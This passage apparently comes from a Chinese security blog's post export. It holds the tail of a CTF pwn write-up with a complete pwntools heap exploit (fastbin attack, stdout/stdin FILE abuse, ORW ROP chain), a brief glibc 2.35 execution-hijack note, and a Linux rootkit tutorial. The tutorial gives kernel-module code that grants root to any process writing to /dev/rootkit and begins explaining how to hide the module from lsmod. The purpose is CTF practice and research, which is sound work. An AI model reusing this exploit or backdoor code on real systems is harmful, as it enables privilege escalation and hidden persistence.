payload)r.interactive()\n\n以上解法为nocbtm师傅的思路。下面为出题人的思路。\n其实出题人的思路在前半部分部分和上面是一样的，同样需要leak libc addr，leak heap addr，fastbin attack这三步攻击。\nenviron在libc中的environ里存放的是stack的地址。\n\n下面就是通过_IO_2_1_stdout_泄漏出environ当中的栈地址\n_IO_2_1_stdout_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]fake_chunk = _IO_2_1_stdout_ - 0x43create(0xc0, b&#x27;&#x27;) create(0x60, b&#x27;&#x27;)delete(3)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk))payload = b&#x27;\\x00&#x27;*3+p64(0)*5+p64(libc_base+libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0xfbad1800)+p64(_IO_2_1_stdout_+131) * \\    3+p64(libc_base+libc.symbols[&#x27;environ&#x27;]) + \\    p64(libc_base+libc.symbols[&#x27;environ&#x27;]+8)create(0x60, b&#x27;&#x27;)create(0x63, payload)r.recvline()stack_addr = u64(r.recvuntil(b&#x27;1: Add a user&#x27;, drop=True))ret_addr = stack_addr-0xf0info(&#x27;stack_addr=&gt;&#x27;+hex(ret_addr))\n\n\n然后经过偏移计算获得main函数的返回地址。\n修改返回地址这里需要使用_IO_2_1_stdin_(不清楚的可以看看这篇文章echo back)来修改返回地址的内容\n_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]fake_chunk = _IO_2_1_stdin_-0x28create(0x60, b&#x27;&#x27;) delete(4)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk)) create(0x40, b&#x27;flag\\x00&#x27;)flag_addr = heap_addr+0x210create(0x60, b&#x27;&#x27;)edit(fake_chunk+0x8, p8(0x71))\n\n\n一样的操作，找到一个假的chunk然后修改_IO_buf_base和_IO_buf_end\npayload = p64(0)+p64(libc_base +                     libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0)+p64(0xfbad1800)+p64(0)*6+p64(ret_addr-2)+p64(ret_addr+0x118)create(0x60, payload)  info(&#x27;fake_chunk=&gt;&#x27;+hex(fake_chunk))\n\n\n紧接着直接申请chunk过去然后修改掉上面两个指针的值，效果如上图。\n\n解释一下为什么要在_IO_buf_base处写上ret_addr-2   =&gt;   因为在最后输入的时候我们是在这个scanf当中输入的，所以我们需要预留两个位置输入b’5\\n’\norw最后因为题目在最后开启了沙盒所以我们只能用orw的方式来读flag。\npop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base+libc.symbols[&#x27;open&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]write_addr = libc_base+libc.symbols[&#x27;write&#x27;]payload = b&#x27;5\\n&#x27;+p64(pop_rdi)+p64(flag_addr) + \\    p64(pop_rsi)+p64(72)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(flag_addr+8)+p64(pop_rdx)+p64(0x30)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + p64(flag_addr+8) + \\    p64(pop_rdx)+p64(0x100)+p64(write_addr)gdb.attach(r)r.recvuntil(b&#x27;&gt;&#x27;)r.sendline(payload)\n\n最后的栈内情况\n\n综上expfrom pwn import *r = process(&#x27;./domo&#x27;)# r = remote(&#x27;1.14.71.254&#x27;, 28041)elf = ELF(&#x27;./domo&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;def create(size, content):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size:&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.sendline(content)def delete(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def show(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def edit(address, num):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;addr:&#x27;)    r.sendline(bytes(str(address), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;num:&#x27;)    r.sendline(num)create(0x40, b&#x27;&#x27;)  # 0create(0x68, b&#x27;&#x27;)  # 1create(0xf0, b&#x27;&#x27;)  # 2create(0x10, b&#x27;&#x27;)  # 3delete(2)create(0xf0, b&#x27;a&#x27;*7)  # 2show(2)print(r.recvuntil(b&#x27;\\n&#x27;))print(r.recvuntil(b&#x27;a\\n&#x27;))main_arena_88 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = 0xf02a4+libc_baseprint(hex(one_gadget))create(0x10, b&#x27;&#x27;)  # 4delete(3)delete(4)create(0x10, b&#x27;&#x27;)  # 3show(3)print(r.recvuntil(b&#x27;\\n&#x27;))heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10a+0x10info(hex(heap_addr))delete(3)delete(0)create(0x40, p64(0)+p64(0xb1)+p64(heap_addr+0x18) +       p64(heap_addr+0x20)+p64(heap_addr+0x10))  # 0delete(1)create(0x68, b&#x27;\\x00&#x27;*0x60+p64(0xb0))  # 1delete(2)_IO_2_1_stdout_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]fake_chunk = _IO_2_1_stdout_ - 0x43create(0xc0, b&#x27;&#x27;)  # 2create(0x60, b&#x27;&#x27;)  # 3delete(3)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk))  # 1payload = b&#x27;\\x00&#x27;*3+p64(0)*5+p64(libc_base+libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0xfbad1800)+p64(_IO_2_1_stdout_+131) * \\    3+p64(libc_base+libc.symbols[&#x27;environ&#x27;]) + \\    p64(libc_base+libc.symbols[&#x27;environ&#x27;]+8)create(0x60, b&#x27;&#x27;)  # 2create(0x63, payload)  # 3r.recvline()stack_addr = u64(r.recvuntil(b&#x27;1: Add a user&#x27;, drop=True))ret_addr = stack_addr-0xf0info(&#x27;ret_addr=&gt;&#x27;+hex(ret_addr))_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]fake_chunk = _IO_2_1_stdin_-0x28create(0x60, b&#x27;&#x27;)  # 4delete(4)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk))  # 1create(0x40, b&#x27;flag\\x00&#x27;)  # 2flag_addr = heap_addr+0x210create(0x60, b&#x27;&#x27;)  # 4edit(fake_chunk+0x8, p8(0x71))payload = p64(0)+p64(libc_base +                     libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0)+p64(0xfbad1800)+p64(0)*6+p64(ret_addr-2)+p64(ret_addr+0x118)create(0x60, payload)  # 5info(&#x27;fake_chunk=&gt;&#x27;+hex(fake_chunk))pop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base+libc.symbols[&#x27;open&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]write_addr = libc_base+libc.symbols[&#x27;write&#x27;]payload = b&#x27;5\\n&#x27;+p64(pop_rdi)+p64(flag_addr) + \\    p64(pop_rsi)+p64(72)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(flag_addr+8)+p64(pop_rdx)+p64(0x30)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + p64(flag_addr+8) + \\    p64(pop_rdx)+p64(0x100)+p64(write_addr)r.recvuntil(b&#x27;&gt;&#x27;)r.sendline(payload)r.interactive()\n\n参考https://blog.play2win.top/2020/05/27/GKCTF%202020%20Domo%E5%88%86%E6%9E%90/#0x0-leak-libc-address%E5%92%8Cheap-address\n","categories":["比赛复现"],"tags":["_IO_FILE","fastbin attack","vtable","off by null"]},{"title":"GLIBC 2.35 hook","url":"/2022/11/04/GLIBC2-35-hook/","content":"引言众所周知在高版本的glibc中取消了free_hook和malloc_hook都被删除掉了。\n那么如果我们存在一个UAF漏洞但是只能申请size为0x20的chunk时就会显得十分窘迫，如果使用选择使用house of emma或者house of apple之类的攻击手法我们就需要花费大量的chunk来进行利用。\n根据上述情况来说就目前我们已学的知识中可以使用exit_hook进行解决，不过就在今天在微信公众号中刷到一篇文章中提到了一篇文章，通过修改_rtld_global._dl_ns._ns_loaded实现劫持程序执行流。\n分析\n如上图所示，在通过exit函数或者程序正常退出时会调用fini_array中的函数\n\n再从这张图中可以看到fini_array中的函数也正是house of banana中提到的_dl_fini函数中调用的，并且可以看到是在\n_rtld_global._dl_ns._ns_loaded这个位置取出程序基地址，随后根据右边的偏移确定fini_array的位置，所以我们可以通过修改上述地址的内容到我们期望的位置即可劫持了。\n\n参考文章：https://www.freebuf.com/articles/system/345968.html\n","categories":["pwn"],"tags":["堆利用","hook"]},{"title":"Linux Rootkit入门","url":"/2024/02/16/Linux-Rootkit/","content":"前言在毕业论文选题时选的是Linux Rootkit相关的内容，加上在前面的许多文章中挖了这个坑终于是现在可以进行填坑活动了😭！\n最近发现确实是有师傅在看我的blog的，并且也会有留言，虽然我每次回复的挺慢的（很少看留言后台），但是留言的条数不多目前在考虑要加上邮件通知不，看看留言的师傅是否会变多如果慢慢有的话可能就会加上了。（主要是懒不想加）\n在前言这里就简单介绍一下Rootkit是什么。\nRootkit即root kit，直译为中文便是根权限工具包的意思，在今天的语境下更多指的是一种被作为驱动程序、加载到操作系统内核中的恶意软件，这一类恶意软件的主要用途便是驻留在计算机上提供 root 后门——当攻击者再次拿到某个服务器的 shell 时可以通过 rootkit 快速提权到 root。\nLinux 下的 rootkit 主要以可装载内核模块（LKM）的形式存在，作为内核的一部分直接以 ring0 权限向入侵者提供服务；当攻击者拿到某台计算机的 shell 并通过相应的漏洞提权到 root 之后便可以在计算机中留下 rootkit，为攻击者后续入侵行为提供驻留的 root 后门。\n但是作为内核的一部分，LKM 编程在一定意义上便是内核编程，与内核版本密切相关，只有使用相应版本内核源码进行编译的 LKM 才可以装载到对应版本的 kernel 上，这使得 Linux rootkit 显得有些鸡肋，且不似蠕虫病毒那般可以在服务期间肆意传播，但不可否认的是 LMK 仍是当前 Linux 下较为主流的 rootkit 技术之一。\nLKM基础既然Linux Rootkit是以LKM的形式存在那么LKM算是最基础的内容了。\nLKM的全称为Loadable Kernel Modules，中文名为可加载内核模块，主要作用是用来扩展linux的内核功能。LKM的优点在于可以动态地加载到内存中，无须重新编译内核。由于LKM具有这样的特点，所以它经常被用于一些设备的驱动程序，例如声卡，网卡等等。当然因为其优点，也经常被骇客用于rootkit技术当中。\n#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;static int rootkit_init(void)&#123;    printk(&quot;test:module loaded\\n&quot;);    return 0;&#125;static void rootkit_exit(void)&#123;    printk(&quot;test:module removed\\n&quot;);&#125;module_init(rootkit_init);module_exit(rootkit_exit);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;196082&quot;);MODULE_INFO(intree, &quot;Y&quot;);\n\n这里简单编一个LKM例子，这里简单介绍一下上述代码中的内容，最后面通过module_init宏定义了rootkit_init函数是该模块的初始化函数，会在该模块被加载时被执行，同样的使用了module_exit宏定义rootkit_exit函数则是该模块被卸载时会被执行即清除函数。这里给人的感觉类似于面对对象编程时的构造函数与析构函数不过不同的是这里如果是没有没有定义清楚函数则该模块是无法被清除的。\n[    4.146208] test:module loaded[   26.022334] test:module removed\n\n但是对于前面这样的程序是没有与用户态存在任何交互的，所以接下来我们需要像实现ctf赛题那样完成我们的rootkit。\n#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/device.h&gt;#define DEVICE_NAME &quot;rootkit&quot;#define CLASS_NAME &quot;rootkit_class&quot;#define DEVICE_PATH &quot;/dev/rootkit&quot;static int rootkit_open(struct inode *__inode, struct file *__file)&#123;    return 0;&#125;static ssize_t rootkit_read(struct file *__file, char __user *user_buf, size_t size, loff_t *__loff)&#123;    return 0;&#125;static ssize_t rootkit_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)&#123;    return 0;&#125;static int rootkit_release(struct inode *__inode, struct file *__file)&#123;    return 0;&#125;static long rootkit_ioctl(struct file *__file, unsigned int cmd, unsigned long param)&#123;    return 0;&#125;static int major_num;static struct class *module_class = NULL;static struct device *module_device = NULL;static struct file *__file = NULL;struct inode *__inode = NULL;static struct file_operations rootkit_fo =    &#123;        .owner = THIS_MODULE,        .unlocked_ioctl = rootkit_ioctl,        .open = rootkit_open,        .read = rootkit_read,        .write = rootkit_write,        .release = rootkit_release,&#125;;static int rootkit_init(void)&#123;    major_num = register_chrdev(0, DEVICE_NAME, &amp;rootkit_fo);    if (major_num &lt; 0)        return major_num;    module_class = class_create(THIS_MODULE, CLASS_NAME);    if (IS_ERR(module_class))    &#123;        unregister_chrdev(major_num, DEVICE_NAME);        return PTR_ERR(module_class);    &#125;    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);    if (IS_ERR(module_device))    &#123;        class_destroy(module_class);        unregister_chrdev(major_num, DEVICE_NAME);        return PTR_ERR(module_device);    &#125;    __file = filp_open(DEVICE_PATH, O_RDONLY, 0);    if (IS_ERR(__file))    &#123;        device_destroy(module_class, MKDEV(major_num, 0));        class_destroy(module_class);        unregister_chrdev(major_num, DEVICE_NAME);        return PTR_ERR(__file);    &#125;    __inode = file_inode(__file);    __inode-&gt;i_mode |= 0666;    filp_close(__file, NULL);    printk(&quot;test:module loaded\\n&quot;);    return 0;&#125;static void rootkit_exit(void)&#123;    device_destroy(module_class, MKDEV(major_num, 0));    class_destroy(module_class);    unregister_chrdev(major_num, DEVICE_NAME);    printk(&quot;test:module removed\\n&quot;);&#125;module_init(rootkit_init);module_exit(rootkit_exit);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;196082&quot;);MODULE_INFO(intree, &quot;Y&quot;);\n\n上面给到一个ctf题目中驱动的大体模板，后续我们也将在这上面进行增加修改等，这里简单说一下在rootkit_init函数中，首先是注册了对应的设备名字，随后创建其class，最后创建设备。在创建完设备之后就可以在系统的/dev目录中看到。\n\n最后这里给到编译驱动所需要的Makefile\nobj-m += rootkit.oCURRENT_PATH := $(shell pwd)LINUX_KERNEL_PATH := ./linux-5.11all:\tmake -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modulesclean:\tmake -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean\n\n这里就不过多解释了相信大家都能看懂。不过好像在linux 5.10之后版本中会出现一些问题，这里在我遇到的问题做一个简单的汇总（不一定全对，因为我没有全部实验过）。\nmake -C ./linux-5.11 M=/media/psf/pwn/rootkit modulesmake[1]: Entering directory &#x27;/media/psf/pwn/rootkit/linux-5.11&#x27;WARNING: Symbol version dump &quot;Module.symvers&quot; is missing.         Modules may not have dependencies or modversions.make[3]: *** No rule to make target &#x27;scripts/module.lds&#x27;, needed by &#x27;/media/psf/pwn/rootkit/rootkit.ko&#x27;.  Stop.make[2]: *** [scripts/Makefile.modpost:117: __modpost] Error 2make[1]: *** [Makefile:1704: modules] Error 2make[1]: Leaving directory &#x27;/media/psf/pwn/rootkit/linux-5.11&#x27;make: *** [Makefile:5: all] Error 2\n\n在编译时遇到了这样一个问题，在我所指向的Linux内核路径下缺少了script/module.lds文件，导致编译出错。经过不断的查找网上说是因为我在编译内核时并没有编译驱动模块导致的，因为我编译内核时确实是使用的make vmlinux / make bzImage。所以我做的就是去编译一下驱动，但是因为我下载的Linux源码是在共享目录解包的缘故会存在解包不完全的情况导致在编译驱动时出现包含错误，并且我的ubuntu虚拟机已经有70G的大小了（懒狗一直没有进行清理过），这也导致我讲源码放到ubuntu家目录解包之后因为大小不足导致失败，所以是否真的可以通过make modules我也不知道。\n最终的解决办法是touch ./linux-5.11/script/module.lds就好了！！！\n至于为什么，是因为scripts/module.lds 文件通常用于链接内核模块（驱动程序）的符号表和地址。当你的驱动程序没有特定的链接脚本时，编译器会使用默认的链接脚本，其中包括一些默认的符号和地址。创建一个空的 module.lds 文件实际上是一种“占位符”方法。它告诉编译器：“嘿，我知道你需要一个链接脚本，但我不需要自定义的符号或地址。请使用默认的链接脚本”。因此，即使是空的 module.lds 文件也足够让编译器成功链接你的驱动程序。\n权限提升struct cred &#123;\tatomic_long_t\tusage;\tkuid_t\t\tuid;\t\t/* real UID of the task */\tkgid_t\t\tgid;\t\t/* real GID of the task */\tkuid_t\t\tsuid;\t\t/* saved UID of the task */\tkgid_t\t\tsgid;\t\t/* saved GID of the task */\tkuid_t\t\teuid;\t\t/* effective UID of the task */\tkgid_t\t\tegid;\t\t/* effective GID of the task */\tkuid_t\t\tfsuid;\t\t/* UID for VFS ops */\tkgid_t\t\tfsgid;\t\t/* GID for VFS ops */\tunsigned\tsecurebits;\t/* SUID-less security management */\tkernel_cap_t\tcap_inheritable; /* caps our children can inherit */\tkernel_cap_t\tcap_permitted;\t/* caps we&#x27;re permitted */\tkernel_cap_t\tcap_effective;\t/* caps we can actually use */\tkernel_cap_t\tcap_bset;\t/* capability bounding set */\tkernel_cap_t\tcap_ambient;\t/* Ambient capability set */#ifdef CONFIG_KEYS\tunsigned char\tjit_keyring;\t/* default keyring to attach requested\t\t\t\t\t * keys to */\tstruct key\t*session_keyring; /* keyring inherited over fork */\tstruct key\t*process_keyring; /* keyring private to this process */\tstruct key\t*thread_keyring; /* keyring private to this thread */\tstruct key\t*request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY\tvoid\t\t*security;\t/* LSM security */#endif\tstruct user_struct *user;\t/* real user ID subscription */\tstruct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */\tstruct ucounts *ucounts;\tstruct group_info *group_info;\t/* supplementary groups for euid/fsgid */\t/* RCU deletion */\tunion &#123;\t\tint non_rcu;\t\t\t/* Can we skip RCU deletion? */\t\tstruct rcu_head\trcu;\t\t/* RCU deletion hook */\t&#125;;&#125; __randomize_layout;\n\n相信前面这个cred结构体大家都不陌生，在Linux中每一个进程在kernel中都有与之对应的cred结构体用以标识其权限。\n这里主要关注其中的uid：\n首先是结构体开头的uid即真实用户注释为real UID of the task，用于表示一个进程启动时的用户ID。\n随后是suid即保存用户id注释为saved UID of the task，用于表示一个进程最初的有效ID。\n然后是euid即有效用户id注释为effective UID of the task，用于标识一个进程正在运行时所属的用户ID，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的。\n最后是fsuid即文件系统用户id注释为UID for VFS ops，用于标识一个进程创建文件时进行标识的用户ID。\n通过commit_creds(prepare_kernel_cred(NULL))提权有kernel pwn基础的朋友都知道如果我们直接修改前面的所有uid为0即可实现提权，所以这里存在两种提权方式，一种是低版本内核版本的使用commit_creds(prepare_kernel_cred(NULL))进行提权，第二种就是通过直接修改cred结构体了。\nstruct cred *prepare_kernel_cred(struct task_struct *daemon)&#123;\tconst struct cred *old;\tstruct cred *new;\tnew = kmem_cache_alloc(cred_jar, GFP_KERNEL);\tif (!new)\t\treturn NULL;\tkdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);\tif (daemon)\t\told = get_task_cred(daemon);\telse\t\told = get_cred(&amp;init_cred);\tvalidate_creds(old);\t*new = *old;\tnew-&gt;non_rcu = 0;\tatomic_set(&amp;new-&gt;usage, 1);\tset_cred_subscribers(new, 0);\tget_uid(new-&gt;user);\tget_user_ns(new-&gt;user_ns);\tget_group_info(new-&gt;group_info);#ifdef CONFIG_KEYS\tnew-&gt;session_keyring = NULL;\tnew-&gt;process_keyring = NULL;\tnew-&gt;thread_keyring = NULL;\tnew-&gt;request_key_auth = NULL;\tnew-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;#endif#ifdef CONFIG_SECURITY\tnew-&gt;security = NULL;#endif\tif (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) &lt; 0)\t\tgoto error;\tput_cred(old);\tvalidate_creds(new);\treturn new;error:\tput_cred(new);\tput_cred(old);\treturn NULL;&#125;EXPORT_SYMBOL(prepare_kernel_cred);\n\n可以看到在低版本的函数中如果传入的是NULL，则直接会去init_cred为old最后复制给new。\nstruct cred *prepare_kernel_cred(struct task_struct *daemon)&#123;\tconst struct cred *old;\tstruct cred *new;\tif (WARN_ON_ONCE(!daemon))\t\treturn NULL;\tnew = kmem_cache_alloc(cred_jar, GFP_KERNEL);\tif (!new)\t\treturn NULL;\tkdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);\told = get_task_cred(daemon);\tvalidate_creds(old);\t*new = *old;\tnew-&gt;non_rcu = 0;\tatomic_set(&amp;new-&gt;usage, 1);\tset_cred_subscribers(new, 0);\tget_uid(new-&gt;user);\tget_user_ns(new-&gt;user_ns);\tget_group_info(new-&gt;group_info);#ifdef CONFIG_KEYS\tnew-&gt;session_keyring = NULL;\tnew-&gt;process_keyring = NULL;\tnew-&gt;thread_keyring = NULL;\tnew-&gt;request_key_auth = NULL;\tnew-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;#endif#ifdef CONFIG_SECURITY\tnew-&gt;security = NULL;#endif\tnew-&gt;ucounts = get_ucounts(new-&gt;ucounts);\tif (!new-&gt;ucounts)\t\tgoto error;\tif (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) &lt; 0)\t\tgoto error;\tput_cred(old);\tvalidate_creds(new);\treturn new;error:\tput_cred(new);\tput_cred(old);\treturn NULL;&#125;EXPORT_SYMBOL(prepare_kernel_cred);\n\n上面是linux 6.2版本中的函数内部，可以看到如果依旧传入NULL则会直接返回NULL导致失败。\n不过这里我做演示的编译的内核版本为5.10所以还是可以通过这一方式进行演示。\nstatic ssize_t rootkit_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)&#123;    commit_creds(prepare_kernel_cred(NULL));    return size;&#125;\n\n首先修改我们的任意一个函数内容为commit_creds(prepare_kernel_cred(NULL))即可。\n~ $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)~ $ echo a &gt; /dev/rootkit ~ # iduid=0(root) gid=0(root)~ # \n\n随后直接往驱动中写入数据即可实现提权。\n通过直接修改cred结构体实现提权int commit_creds(struct cred *new)&#123;\tstruct task_struct *task = current;\tconst struct cred *old = task-&gt;real_cred;\tkdebug(&quot;commit_creds(%p&#123;%d,%d&#125;)&quot;, new,\t       atomic_read(&amp;new-&gt;usage),\t       read_cred_subscribers(new));\tBUG_ON(task-&gt;cred != old);#ifdef CONFIG_DEBUG_CREDENTIALS\tBUG_ON(read_cred_subscribers(old) &lt; 2);\tvalidate_creds(old);\tvalidate_creds(new);#endif\tBUG_ON(atomic_read(&amp;new-&gt;usage) &lt; 1);\tget_cred(new); /* we will require a ref for the subj creds too */\t/* dumpability changes */\tif (!uid_eq(old-&gt;euid, new-&gt;euid) ||\t    !gid_eq(old-&gt;egid, new-&gt;egid) ||\t    !uid_eq(old-&gt;fsuid, new-&gt;fsuid) ||\t    !gid_eq(old-&gt;fsgid, new-&gt;fsgid) ||\t    !cred_cap_issubset(old, new)) &#123;\t\tif (task-&gt;mm)\t\t\tset_dumpable(task-&gt;mm, suid_dumpable);\t\ttask-&gt;pdeath_signal = 0;\t\t/*\t\t * If a task drops privileges and becomes nondumpable,\t\t * the dumpability change must become visible before\t\t * the credential change; otherwise, a __ptrace_may_access()\t\t * racing with this change may be able to attach to a task it\t\t * shouldn&#x27;t be able to attach to (as if the task had dropped\t\t * privileges without becoming nondumpable).\t\t * Pairs with a read barrier in __ptrace_may_access().\t\t */\t\tsmp_wmb();\t&#125;\t/* alter the thread keyring */\tif (!uid_eq(new-&gt;fsuid, old-&gt;fsuid))\t\tkey_fsuid_changed(new);\tif (!gid_eq(new-&gt;fsgid, old-&gt;fsgid))\t\tkey_fsgid_changed(new);\t/* do it\t * RLIMIT_NPROC limits on user-&gt;processes have already been checked\t * in set_user().\t */\talter_cred_subscribers(new, 2);\tif (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)\t\tinc_rlimit_ucounts(new-&gt;ucounts, UCOUNT_RLIMIT_NPROC, 1);\trcu_assign_pointer(task-&gt;real_cred, new);\trcu_assign_pointer(task-&gt;cred, new);\tif (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)\t\tdec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, 1);\talter_cred_subscribers(old, -2);\t/* send notifications */\tif (!uid_eq(new-&gt;uid,   old-&gt;uid)  ||\t    !uid_eq(new-&gt;euid,  old-&gt;euid) ||\t    !uid_eq(new-&gt;suid,  old-&gt;suid) ||\t    !uid_eq(new-&gt;fsuid, old-&gt;fsuid))\t\tproc_id_connector(task, PROC_EVENT_UID);\tif (!gid_eq(new-&gt;gid,   old-&gt;gid)  ||\t    !gid_eq(new-&gt;egid,  old-&gt;egid) ||\t    !gid_eq(new-&gt;sgid,  old-&gt;sgid) ||\t    !gid_eq(new-&gt;fsgid, old-&gt;fsgid))\t\tproc_id_connector(task, PROC_EVENT_GID);\t/* release the old obj and subj refs both */\tput_cred(old);\tput_cred(old);\treturn 0;&#125;EXPORT_SYMBOL(commit_creds);\n\n这里先关注一下前面提到的commit_creds函数，函数开头先通过current宏获取到task_struct结构体，随后获取到内部的cred，后面将task_struct-&gt;real_cred和task_struct-&gt;cred成员修改为新传入的cred，最终实现了权限改变。\n所以如果我们想要直接修改cred结构体我们可以通过同样的办法获取得到cred结构体并加以修改。\nstatic ssize_t rootkit_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)&#123;    struct task_struct *task = current;    struct cred *old = task-&gt;real_cred;    old-&gt;gid = old-&gt;sgid = old-&gt;egid = KGIDT_INIT(0);    old-&gt;uid = old-&gt;suid = old-&gt;euid = KUIDT_INIT(0);    return size;&#125;\n\n所以很简单的就可以修改上述函数。\n~ $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)~ $ echo a &gt; /dev/rootkit ~ # iduid=0(root) gid=0(root) groups=1000(ctf)~ # \n\n随后成功提权。\n模块隐藏目前存在一个十分尴尬的问题就是我们载入rootkit时会发现只需要lsmod就可以看到了\n~ $ lsmod rootkit 16384 0 - Live 0x0000000000000000 (E)~ $ \n\n当然，我们可以利用very_important_module_not_root_kit_please_donot_remove_it取一个非常正常的名字让用户不会猜测我们，但是这样也不能完全保证不被发现。所以最好的办法就是让用户无法直接发现我们的rootkit。\n/proc/modules信息隐藏Linux 下用以查看模块的命令 lsmod 其实是从 /proc/modules 这个文件中读取并进行整理，该文件的内容来自于内核中的 module 双向链表，那么我们只需要将 rootkit 从双向链表中移除即可完成 procfs 中的隐藏。\n所以这里就简单介绍一下内核中的module双向链表\nstruct module &#123;\tenum module_state state;\t/* Member of list of modules */\tstruct list_head list;\t/* Unique handle for this module */\tchar name[MODULE_NAME_LEN];#ifdef CONFIG_STACKTRACE_BUILD_ID\t/* Module build ID */\tunsigned char build_id[BUILD_ID_SIZE_MAX];#endif\t/* Sysfs stuff. */\tstruct module_kobject mkobj;\tstruct module_attribute *modinfo_attrs;\tconst char *version;\tconst char *srcversion;\tstruct kobject *holders_dir;\t/* Exported symbols */\tconst struct kernel_symbol *syms;\tconst s32 *crcs;\tunsigned int num_syms;#ifdef CONFIG_ARCH_USES_CFI_TRAPS\ts32 *kcfi_traps;\ts32 *kcfi_traps_end;#endif\t/* Kernel parameters. */#ifdef CONFIG_SYSFS\tstruct mutex param_lock;#endif\tstruct kernel_param *kp;\tunsigned int num_kp;\t/* GPL-only exported symbols. */\tunsigned int num_gpl_syms;\tconst struct kernel_symbol *gpl_syms;\tconst s32 *gpl_crcs;\tbool using_gplonly_symbols;#ifdef CONFIG_MODULE_SIG\t/* Signature was verified. */\tbool sig_ok;#endif\tbool async_probe_requested;\t/* Exception table */\tunsigned int num_exentries;\tstruct exception_table_entry *extable;\t/* Startup function. */\tint (*init)(void);\tstruct module_memory mem[MOD_MEM_NUM_TYPES] __module_memory_align;\t/* Arch-specific module values */\tstruct mod_arch_specific arch;\tunsigned long taints;\t/* same bits as kernel:taint_flags */#ifdef CONFIG_GENERIC_BUG\t/* Support for BUG */\tunsigned num_bugs;\tstruct list_head bug_list;\tstruct bug_entry *bug_table;#endif#ifdef CONFIG_KALLSYMS\t/* Protected by RCU and/or module_mutex: use rcu_dereference() */\tstruct 